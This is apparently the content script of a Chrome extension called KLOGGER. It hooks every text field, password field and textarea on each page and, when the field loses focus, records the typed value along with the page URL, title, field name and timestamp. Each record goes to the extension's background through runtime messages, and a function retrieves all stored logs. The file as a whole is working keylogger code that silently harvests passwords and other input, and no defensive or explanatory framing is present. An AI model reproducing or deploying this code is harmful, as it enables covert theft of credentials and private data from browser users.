(function($){
  KLOGGER={}

  //initialises stuff, also attaches events to every textboxe's unb
  KLOGGER.init=function(){
    var isSupported = "localStorage" in window,
        error = {},
        store = null,
        log = {}

    if(isSupported){
      KLOGGER.logPort = chrome.runtime.connect({name:"klogger"})
      var allInputs = $("[type=text],[type=password],textarea");
      allInputs.each(function()
      {
        var el=$(this)
        var originalFn =el.blur;

        el.blur(function(){
          log.link = window.location.href;
          log.pageTitle = $('title').text();
          log.inputName = this.name;
          log.data= this.value;
          log.date = new Date().getTime();
          if(log.data !== ""){
            KLOGGER.addLog(log);
          }
          el.blur = originalFn;
          //el.trigger('blur');
        })
      });
    }
    else{
      error.message = "Local Storage not supported"
    }
  }

  //save just one log
  KLOGGER.addLog=function(log){
    var message = {
      type:"addLog",
      data:log
    }
    chrome.runtime.sendMessage(message,function(msg){
      console.log(msg);
    });
  }

  //get all logs
  KLOGGER.getLogs=function(){
    var message = {
      type:"getAll",
      data:null
    }
    chrome.runtime.sendMessage(message,function(msg){
      console.log(msg);
    });
  }

  KLOGGER.init();
})(jQuery,undefined)